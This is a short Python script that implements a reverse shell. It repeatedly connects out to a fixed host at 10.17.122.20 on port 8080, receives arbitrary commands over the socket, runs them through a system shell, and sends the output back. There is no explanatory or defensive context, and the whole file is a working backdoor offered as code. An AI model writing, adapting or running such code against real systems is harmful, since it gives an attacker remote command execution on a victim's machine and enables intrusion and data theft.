# Created by Louis Kraimer

import socket
import subprocess
import os
import sys
import time

def tuneconnection():
    mysocket = socket.socket()
    while True:
        time.sleep(10)
        try:
            mysocket.connect(("10.17.122.20", 8080))
            shell(mysocket)
        except:
            tuneconnection()

def shell(mysocket):
    while True:
        command = mysocket.recv(5000)
        if "seeya" in command.decode():
            try:
                mysocket.close()
                break
            except Exception as e:
                informToServer = "!ERR!: " + str(e)
                mysocket.send(informToServer.encode())
                break
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "Current Working Directory is: " + os.getcwd()
                mysocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "!ERR!: " + str(e)
                mysocket.send(informToServer.encode())
        else:
            cmd = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mysocket.send(cmd.stdout.read())
            mysocket.send(cmd.stderr.read())
def main():
    tuneconnection()
main()

